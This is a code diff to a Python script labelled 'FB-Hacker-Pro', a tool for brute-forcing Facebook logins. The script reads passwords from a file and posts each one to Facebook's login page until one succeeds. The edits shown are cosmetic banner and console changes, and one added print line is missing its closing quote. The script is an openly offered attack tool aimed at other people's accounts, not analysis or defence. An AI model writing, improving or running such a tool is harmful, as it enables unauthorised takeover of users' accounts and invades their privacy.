@@ -9,11 +9,9 @@ try:
 	if sys.version_info[0] < 3:
 		raise "REQUIRED PYTHON 3.x"
 except Exception as ex:
-	print('''--------------------------------------
-			use: python3 fb.py
-		 --------------------------------------
-			''')
+	print('warming : use python3 fbbrute.py')
 	sys.exit()
+	
 post_url='https://www.facebook.com/login.php'
 headers = {
 	'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
@@ -26,8 +24,6 @@ def create_form():
 	data=requests.get(post_url,headers=headers)
 	# print('Form Creating : ',data.url)
 	# print('Return Status : ',data.status_code)
-	#for i in data.headers:
-	#	print(i,' : ',data.headers[i])
 	for i in data.cookies:
 		cookie[i.name]=i.value
 	data=BeautifulSoup(data.text,'html.parser').form
@@ -52,15 +48,17 @@ def function(email,passw,i):
 		return True
 	return False
 
-#payload=create_form()
+#payload creation form
 
-G = '/003[32;1m'
-print (G)
+os.system("clear")
 
 i=0
-print(" --------------[FB-Hacker-Pro]---------------\n")
-print(" --------------------------------------------\n\n")
-print("   Author - Hein Arkar(Wtobe_Shining_Star) \n\n")
+print(" ____________________________________________            * \n")
+print(" |-------------[FB-Hacker-Pro]--------------|\n")
+print(" |------------------------------------------|                                    *\n")
+print(" /------------------------------------------\\      \n)
+
+print("*  Author - Hein Arkar(Wtobe_Shining_Star) \n\n")
 
 print('''              ▇▇▇◤▔▔▔▔▔▔▔◥▇▇▇
               ▇▇▇▏◥▇◣┊◢▇◤▕▇▇▇
@@ -87,6 +85,4 @@ while file:
 	print("Trying Password " + str(i) +": ",passw+ "\t\t[Not Found] ") 
 	if function(email,passw,i):
 		break
-	# threading.Thread(target=function,args=(email,passw,i)).start()
-	# if not i%10:
-		# os.system('pause')
+
